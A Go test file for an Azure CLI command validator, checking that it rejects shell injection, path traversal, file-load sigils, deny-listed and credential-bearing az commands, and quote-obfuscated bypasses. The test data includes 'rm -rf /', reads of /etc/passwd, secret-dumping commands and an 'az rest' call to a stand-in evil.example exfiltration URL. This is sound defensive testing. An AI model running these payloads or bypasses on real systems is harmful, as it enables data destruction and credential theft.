package azcli

import (
	"os"
	"path/filepath"
	"testing"
)

func TestValidator_ValidateBasicSecurity(t *testing.T) {
	validator := &DefaultValidator{
		readOnlyMode:         false,
		enableSecurityPolicy: false,
	}

	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid az command",
			input:   "az vm list --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "command without az prefix",
			input:   "ls -la",
			wantErr: true,
		},
		{
			name:    "command with pipe",
			input:   "az vm list | cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "command with redirect",
			input:   "az vm list > output.txt",
			wantErr: true,
		},
		{
			name:    "command with semicolon",
			input:   "az vm list; rm -rf /",
			wantErr: true,
		},
		{
			name:    "command with dollar sign",
			input:   "az vm list $VAR",
			wantErr: true,
		},
		{
			name:    "command with backtick",
			input:   "az vm list `whoami`",
			wantErr: true,
		},
		{
			name:    "command with path traversal",
			input:   "az vm list --file ../../../etc/passwd",
			wantErr: true,
		},
		{
			name:    "command with newline",
			input:   "az vm list\nrm -rf /",
			wantErr: true,
		},
		{
			name:    "command with @ file-load sigil in --query",
			input:   "az vm list --query @/etc/passwd",
			wantErr: true,
		},
		{
			name:    "command with @ file-load sigil in --body",
			input:   "az rest --method post --uri https://management.azure.com/ --body @/tmp/payload.json",
			wantErr: true,
		},
		{
			name:    "command with =@ file-load sigil in --query=@",
			input:   "az vm list --query=@/etc/passwd",
			wantErr: true,
		},
		{
			name:    "command with UPN containing @ - allowed",
			input:   "az ad user show --id user@example.com",
			wantErr: false,
		},
		{
			name:    "command with role assignee UPN - allowed",
			input:   "az role assignment list --assignee bob@contoso.com",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			argv, _ := tokenizeCommand(tt.input)
			err := validator.validateBasicSecurity(tt.input, argv)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateBasicSecurity() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidator_CheckReadOnly(t *testing.T) {
	tmpDir := t.TempDir()
	patternsFile := filepath.Join(tmpDir, "readonly-patterns.yaml")

	patternsContent := `patterns:
- "^az ([a-z-]+ )+list($| )"
- "^az ([a-z-]+ )+list-[a-z-]+($| )"
- "^az ([a-z-]+ )+show($| )"
- "^az account show($| )"
`
	if err := os.WriteFile(patternsFile, []byte(patternsContent), 0644); err != nil {
		t.Fatal(err)
	}

	patterns, err := LoadReadOnlyPatterns(patternsFile)
	if err != nil {
		t.Fatal(err)
	}

	validator := &DefaultValidator{
		readOnlyMode:     true,
		readOnlyPatterns: patterns,
	}

	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "read-only list command - single level",
			input:   "az vm list --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "read-only show command - single level",
			input:   "az vm show --name myVM --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "read-only account show",
			input:   "az account show",
			wantErr: false,
		},
		{
			name:    "read-only list-sizes command",
			input:   "az vm list-sizes --location eastus",
			wantErr: false,
		},
		{
			name:    "read-only list-skus command",
			input:   "az vm list-skus --location eastus",
			wantErr: false,
		},
		{
			name:    "read-only nested list command - 2 levels",
			input:   "az aks nodepool list --cluster-name aks-oidc-demo --resource-group guwe-rg-oidc-demo-1",
			wantErr: false,
		},
		{
			name:    "read-only nested list command with output flag",
			input:   "az aks nodepool list --cluster-name aks-oidc-demo --resource-group guwe-rg-oidc-demo-1 --output table",
			wantErr: false,
		},
		{
			name:    "read-only nested show command - 2 levels",
			input:   "az aks nodepool show --name nodepool1 --cluster-name aks-demo --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "read-only nested list command - network vnet",
			input:   "az network vnet list --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "read-only nested list-skus command - 2 levels",
			input:   "az aks nodepool list-skus --cluster-name aks-demo --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "read-only deeply nested list - 3 levels",
			input:   "az network vnet subnet list --resource-group myRG --vnet-name myVnet",
			wantErr: false,
		},
		{
			name:    "read-only deeply nested show - 3 levels",
			input:   "az network vnet subnet show --resource-group myRG --vnet-name myVnet --name mySubnet",
			wantErr: false,
		},
		{
			name:    "write command - create",
			input:   "az vm create --name myVM --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - delete",
			input:   "az vm delete --name myVM --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - update",
			input:   "az vm update --name myVM --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - nested add",
			input:   "az aks nodepool add --name newpool --cluster-name aks-demo --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - nested delete",
			input:   "az aks nodepool delete --name oldpool --cluster-name aks-demo --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - nested update",
			input:   "az aks nodepool update --name pool1 --cluster-name aks-demo --resource-group myRG",
			wantErr: true,
		},
		{
			name:    "write command - deeply nested create",
			input:   "az network vnet subnet create --resource-group myRG --vnet-name myVnet --name mySubnet",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			argv, _ := tokenizeCommand(tt.input)
			err := validator.checkReadOnly(tt.input, argv)
			if (err != nil) != tt.wantErr {
				t.Errorf("checkReadOnly() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidator_CheckDenyList(t *testing.T) {
	policy := &SecurityPolicy{
		Version: "1.0",
		Policy: PolicyRules{
			DenyList: []string{
				"az account clear",
				"az login",
				"az logout",
				"az vm delete",
				"az group delete",
			},
		},
	}

	validator := &DefaultValidator{
		enableSecurityPolicy: true,
		policy:               policy,
		policyDenyArgv:       tokenizePolicyEntries(policy.Policy.DenyList),
	}

	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "allowed command",
			input:   "az vm list --resource-group myRG",
			wantErr: false,
		},
		{
			name:    "denied - account clear",
			input:   "az account clear",
			wantErr: true,
		},
		{
			name:    "denied - login",
			input:   "az login",
			wantErr: true,
		},
		{
			name:    "denied - vm delete",
			input:   "az vm delete --name myVM",
			wantErr: true,
		},
		{
			name:    "denied - group delete",
			input:   "az group delete --name myRG",
			wantErr: true,
		},
		{
			name:    "denied - vm delete with extra spaces (whitespace bypass attempt)",
			input:   "az  vm  delete --name myVM",
			wantErr: true,
		},
		{
			name:    "denied - login with leading spaces",
			input:   "az   login",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			argv, _ := tokenizeCommand(tt.input)
			err := validator.checkDenyList(tt.input, argv)
			if (err != nil) != tt.wantErr {
				t.Errorf("checkDenyList() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestDefaultSecurityPolicy_DeniesMSRCFindings verifies that the embedded
// default security policy blocks the deny-listed commands identified in
// MSRC 31000000579651 (subscription context switch via `az account set` and
// raw REST access via `az rest`).
func TestDefaultSecurityPolicy_DeniesMSRCFindings(t *testing.T) {
	policy, err := LoadSecurityPolicy("")
	if err != nil {
		t.Fatalf("LoadSecurityPolicy: %v", err)
	}
	validator := &DefaultValidator{
		enableSecurityPolicy: true,
		policy:               policy,
		policyDenyArgv:       tokenizePolicyEntries(policy.Policy.DenyList),
	}

	denied := []string{
		"az account set --subscription 00000000-0000-0000-0000-000000000000",
		"az rest --method delete --uri https://management.azure.com/subscriptions/x/resourceGroups/y?api-version=2021-04-01",
	}
	for _, cmd := range denied {
		argv, _ := tokenizeCommand(cmd)
		if err := validator.checkDenyList(cmd, argv); err == nil {
			t.Errorf("expected default policy to deny %q, but it was allowed", cmd)
		}
	}
}

func TestLoadReadOnlyPatterns(t *testing.T) {
	tmpDir := t.TempDir()
	patternsFile := filepath.Join(tmpDir, "patterns.yaml")

	content := `patterns:
  - "^az [a-z-]+ list($| )"
  - "^az [a-z-]+ show($| )"
`
	if err := os.WriteFile(patternsFile, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	patterns, err := LoadReadOnlyPatterns(patternsFile)
	if err != nil {
		t.Errorf("LoadReadOnlyPatterns() error = %v", err)
	}

	if len(patterns.Patterns) != 2 {
		t.Errorf("expected 2 patterns, got %d", len(patterns.Patterns))
	}
}

func TestLoadSecurityPolicy(t *testing.T) {
	tmpDir := t.TempDir()
	policyFile := filepath.Join(tmpDir, "policy.yaml")

	content := `version: "1.0"
policy:
  denyList:
    - "az account clear"
    - "az login"
`
	if err := os.WriteFile(policyFile, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	policy, err := LoadSecurityPolicy(policyFile)
	if err != nil {
		t.Errorf("LoadSecurityPolicy() error = %v", err)
	}

	if policy.Version != "1.0" {
		t.Errorf("expected version 1.0, got %s", policy.Version)
	}

	if len(policy.Policy.DenyList) != 2 {
		t.Errorf("expected 2 denied commands, got %d", len(policy.Policy.DenyList))
	}
}

func TestValidator_CheckReadOnly_CredentialBearingCommands(t *testing.T) {
	patterns, err := LoadReadOnlyPatterns("")
	if err != nil {
		t.Fatal(err)
	}

	validator := &DefaultValidator{
		readOnlyMode:       true,
		readOnlyPatterns:   patterns,
		credentialDenyArgv: tokenizePolicyEntries(credentialDenyPrefixes),
	}

	credentialCommands := []struct {
		name  string
		input string
	}{
		{"get-access-token", "az account get-access-token"},
		{"get-access-token with resource", "az account get-access-token --resource https://management.azure.com/"},
		{"aks get-credentials", "az aks get-credentials --resource-group rg --name cluster"},
		{"aks get-credentials with file", "az aks get-credentials --resource-group rg --name cluster --file /tmp/kube"},
		{"fleet get-credentials", "az fleet get-credentials --resource-group rg --name fleet"},
		{"ad app credential list", "az ad app credential list --id abc"},
		{"ad sp credential list", "az ad sp credential list --id xyz"},
		{"storage account keys list", "az storage account keys list --account-name mystorage --resource-group rg"},
		{"storage account show-connection-string", "az storage account show-connection-string --name mystorage --resource-group rg"},
		{"keyvault secret show", "az keyvault secret show --vault-name myvault --name mysecret"},
		{"keyvault secret list", "az keyvault secret list --vault-name myvault"},
		{"keyvault secret download", "az keyvault secret download --vault-name myvault --name mysecret --file /tmp/s"},
		{"cosmosdb keys list", "az cosmosdb keys list --name mycosmos --resource-group rg"},
		{"cosmosdb list-connection-strings", "az cosmosdb list-connection-strings --name mycosmos --resource-group rg"},
		{"redis list-keys", "az redis list-keys --name myredis --resource-group rg"},
		{"acr credential show", "az acr credential show --name myacr"},
		{"cognitiveservices account keys list", "az cognitiveservices account keys list --name myopenai --resource-group rg"},
		{"servicebus authorization-rule keys list", "az servicebus namespace authorization-rule keys list --resource-group rg --namespace-name myns --name RootManageSharedAccessKey"},
		{"eventhubs authorization-rule keys list", "az eventhubs namespace authorization-rule keys list --resource-group rg --namespace-name myns --name RootManageSharedAccessKey"},
		{"webapp config appsettings list", "az webapp config appsettings list --name myapp --resource-group rg"},
		{"functionapp config appsettings list", "az functionapp config appsettings list --name myfunc --resource-group rg"},
		{"whitespace-bypass attempt", "az  storage  account  keys  list --account-name mystorage --resource-group rg"},
	}

	for _, tt := range credentialCommands {
		t.Run(tt.name, func(t *testing.T) {
			argv, _ := tokenizeCommand(tt.input)
			err := validator.checkReadOnly(tt.input, argv)
			if err == nil {
				t.Errorf("checkReadOnly(%q) expected error (credential-bearing command), got nil", tt.input)
			}
		})
	}
}

// TestValidator_QuoteBypass_AllChecks is a regression net spanning every
// token-level validator decision. Each payload uses interior quoting that
// would hide its shape from a whitespace-only tokenizer (strings.Fields) but
// canonicalizes to the dangerous argv shown alongside, because the executor's
// quote-aware lexer strips interior quotes. Since the validator now sees the
// same argv as the executor, every payload must be rejected by the same
// guard that would reject its bare-quoted equivalent.
//
// If any of these regress to "allowed", the tokenizer-divergence class is
// re-open and a new spot-fix variant is on its way.
func TestValidator_QuoteBypass_AllChecks(t *testing.T) {
	// Build a validator that has every check active: read-only mode on (with
	// embedded patterns), security policy on (with embedded deny list),
	// credential denylist on. Mirrors the strictest deployed configuration.
	policy, err := LoadSecurityPolicy("")
	if err != nil {
		t.Fatalf("LoadSecurityPolicy: %v", err)
	}
	patterns, err := LoadReadOnlyPatterns("")
	if err != nil {
		t.Fatalf("LoadReadOnlyPatterns: %v", err)
	}
	v := &DefaultValidator{
		readOnlyMode:         true,
		enableSecurityPolicy: true,
		policy:               policy,
		policyDenyArgv:       tokenizePolicyEntries(policy.Policy.DenyList),
		readOnlyPatterns:     patterns,
		credentialDenyArgv:   tokenizePolicyEntries(credentialDenyPrefixes),
	}

	cases := []struct {
		name    string
		payload string
		// reason describes which check should fire after quote-stripping
		reason string
	}{
		{
			name:    "quoted az prefix",
			payload: `"a"z account get-access-token`,
			reason:  "argv[0]=='az' check + credential denylist must match after dequoting",
		},
		{
			name:    "single-quoted az prefix",
			payload: `'az' account get-access-token`,
			reason:  "same as above",
		},
		{
			name:    "quoted @-query (would hide @-file-load)",
			payload: `az vm list --query "@/etc/passwd"`,
			reason:  "basic-security must reject @-prefixed value tokens regardless of quoting",
		},
		{
			name:    "quoted =@-body",
			payload: `az vm list --query="@/etc/passwd"`,
			reason:  "basic-security must reject =@ in flag tokens regardless of quoting",
		},
		{
			name:    "quoted denylist prefix",
			payload: `"a"z group delete --name myrg --yes`,
			reason:  "policy deny list contains 'az group delete'; argv-prefix must match after dequoting",
		},
		{
			name:    "quoted credential denylist",
			payload: `"a"z storage account keys list --account-name a --resource-group r`,
			reason:  "credential denylist must match after dequoting",
		},
		{
			name:    "quoted az rest --url to evil",
			payload: `az rest --u"rl"=https://evil.example/steal --resource https://management.azure.com/`,
			reason:  "REST must remain disabled regardless of quoted URL flags",
		},
		{
			name:    "quoted az rest --uri to evil",
			payload: `az rest --u"ri"=https://evil.example/steal`,
			reason:  "REST must remain disabled regardless of quoted URI flags",
		},
		{
			name:    "quoted az rest --resource only",
			payload: `az rest --reso"urce" https://management.azure.com/`,
			reason:  "REST must remain disabled without a URL",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			argv, tokErr := tokenizeCommand(tc.payload)
			if tokErr != nil {
				t.Fatalf("tokenizeCommand(%q) error: %v", tc.payload, tokErr)
			}
			if err := v.Validate(tc.payload, argv); err == nil {
				t.Errorf("payload %q (reason: %s) was accepted; expected rejection. canonical argv: %v",
					tc.payload, tc.reason, argv)
			}
		})
	}
}
